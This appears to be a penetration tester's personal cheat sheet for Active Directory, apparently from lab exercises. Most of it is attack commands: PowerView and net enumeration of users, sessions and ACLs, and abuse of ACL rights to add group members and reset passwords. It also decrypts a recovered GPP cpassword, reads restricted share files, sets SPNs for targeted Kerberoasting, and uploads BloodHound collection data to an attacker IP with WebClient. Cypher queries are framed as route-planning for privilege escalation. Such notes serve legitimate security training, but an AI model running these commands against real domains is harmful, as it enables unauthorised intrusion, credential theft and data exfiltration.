## Active Directory Enumeration

### Links
- [S1ckB0y1337 Notes](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file)
- [Payload All the Things AD Attack](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Active%20Directory%20Attack/)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [BloodHound Custom Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
- [WADComs](https://wadcoms.github.io/#)
- [LOLBAS](https://lolbas-project.github.io/)
### Manual Enumeration

```
Without PowerView:
net user # All local accounts
net user <user>
net user /domain # All local users in entire domain
net user <username> /domain # See if he is member of *Domain Admins group in *Global group memberships

# IMP
net group /domain # Enumerate Groups in Domain
net group "Domain Admins" # To find who is part of domain admins

PowerView (HeathAdams)
PowerShell -ep bypass
. .\PowerView.ps1

Get-NetDomainController # IP of DC, Name of DC

Get-DomainPolicy # Domain policies, like pass policies ,etc
(Get-DomainPolicy).”SystemAccess”

Get-NetUser # All users # Sometimes password in Decription
Get-NetUser | select samaccountname # Only account names
Get-NetUser | select cn # Only usernames
Get-NetUser | select description # Only descriptions
Get-NetUser -SPN | select serviceprincipalname # Kerbroastable SPN's

Get-UserProperty
Get-UserProperty -Properties pwdlastset # Last password set
Get-UserProperty -Properties logoncount # Good way to know honeypot accounts
Get-UserProperty -Properties badpwdcount # Bad password attempts

Get-NetComputer # Computers in domain
Get-NetComputer -FullData
Get-NetComputer -Unconstrained
Get-NetComputer | Get-NetLoggedon # Active users
Get-NetComputer -FullData | select OperatingSystem # OS

Get-NetGroup -GroupName *admin* # Important # Groups
Get-NetGroupMember -GroupName "Domain Admins" 
# Important # Members of Domain Admins group
Get-NetGroup -AdminCount | select name,memberof,admincount,member # Part of domain admin

Invoke-ShareFinder # For shares

Get-NetGPO # Group policies
Get-NetGPO | select displayname, whenchanged # Better output

# Get-DomainOU -> Search for all (OUs) or specific OU objects in AD.
Get-DomainOU -Properties Name | sort -Property Name
```

### More Manual

```

powershell -ep bypass
Import-Module .\PowerView.ps1

Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname, distinguishedname, operatingsystemversion


Find-LocalAdminAccess
Get-NetSession -ComputerName files04
Get-NetSession -ComputerName web04
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose
Get-NetSession -ComputerName client74
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
.\PsLoggedon.exe \\files04
.\PsLoggedon.exe \\web04
.\PsLoggedon.exe \\client74


setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe web04.corp.com

```


### Manual Object Permissions

```

Permission Types:
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group


Get-ObjectAcl -Identity stephanie
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

net group "Management Department" stephanie /add /domain
Get-NetGroup "Management Department" | select member
net group "Management Department" stephanie /del /domain
Get-NetGroup "Management Department" | select member
```

### Manual Domain Shares

```


Find-DomainShare
ls \\dc1.corp.com\ADMIN$\
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
ls \\FILES04\docshare
ls "\\FILES04\Important Files"
cat "\\FILES04\Important Files\proof.txt"
ls \\FILES04\docshare\docs\do-not-share
cat \\FILES04\docshare\docs\do-not-share\start-email.txt

```


### Automate

```

Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\ -OutputPrefix "medtech12audit"
ls C:\Users\stephanie\Desktop\


powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\temp\medtech12audit_20240208023054_BloodHound.zip')"

(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\Users\stephanie\Desktop\corp audit_20240201105818_BloodHound.zip')



sudo neo4j start
**http://localhost:7474**
neo4j/neo4j
bloodhound


$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

Get-DomainSPNTicket -Credential $Cred harmj0y | fl

Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname

or

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('CORP\dfm.a', $SecPassword)

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity robert -AccountPassword $UserPassword -Credential $Cred


$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity robert -AccountPassword $UserPassword

net user robert Password123! /domain


# Find-InterestingDomainAcl


```


### Custom BloodHound Queries

#### Query to List All Users

This query returns all user objects in the Active Directory, which can be useful for identifying potential targets for further exploitation or reconnaissance.

cypherCopy code

`MATCH (u:User) RETURN u.name`

#### Query to List All Computers

This query returns all computer objects in the Active Directory. Identifying all computers can help in understanding the network's structure and identifying valuable targets for lateral movement or further exploitation.

cypherCopy code

`MATCH (c:Computer) RETURN c.name`

#### 1. Find All Domain Admins

Identify all users who are members of the Domain Admins group, which will give you insights into high-value targets within the network.

cypherCopy code

`MATCH (g:Group)-[:MemberOf*1..]->(h:Group {name: 'Domain Admins@DOMAIN.COM'}) MATCH (u:User)-[:MemberOf]->(g) RETURN u.name`

#### 2. Uncover Shortest Paths to Domain Admins

Discover the shortest paths that could be exploited to elevate privileges to Domain Admin level. This can help in planning an attack route.

cypherCopy code

`MATCH (u:User),(g:Group {name: 'Domain Admins@DOMAIN.COM'}), p = shortestPath((u)-[:MemberOf*1..]->(g)) RETURN p`

#### 3. Identify Users with Unconstrained Delegation Rights

Users with unconstrained delegation rights can impersonate any user to any service. This query helps identify such users, presenting a significant security risk.

cypherCopy code

`MATCH (u:User {allowedtodelegate: true}) RETURN u.name`

#### 4. Find Computers Where Domain Admins Have Sessions

Identifying machines where Domain Admins have active sessions can be useful for moving laterally within the network.

cypherCopy code

`MATCH (c:Computer)<-[:HasSession]-(u:User) WHERE u.name CONTAINS 'Domain Admins@DOMAIN.COM' RETURN c.name, u.name`

#### 5. Detect All Kerberoastable Accounts

Kerberoasting targets service accounts by requesting service tickets that can be cracked offline. This query finds service accounts that can be Kerberoasted.

cypherCopy code

`MATCH (u:User {hasspn: true})  RETURN u.name`

#### 6. Enumerate ACL Exploitation Paths

Access Control List (ACL) exploitation can be a powerful method for escalating privileges. This query helps identify potential ACL exploit paths.

cypherCopy code

`MATCH p = (n)-[r:WriteDacl|WriteOwner|GenericAll|GenericWrite|Owns]->(m) RETURN p`

#### 7. Find All Trust Relationships

Understanding trust relationships between domains can reveal paths for lateral movement and privilege escalation.

cypherCopy code

`MATCH (d:Domain)-[:TrustedBy]->(t:Domain) RETURN d.name, t.name`

#### 8. Identify Orphaned Objects

Orphaned objects (users, computers) can sometimes retain privileges and be overlooked. This query helps spot such objects.

cypherCopy code

`MATCH (n) WHERE NOT (n)-[:MemberOf]->() RETURN n.name, labels(n)`


![[Pasted image 20240229210421.png]]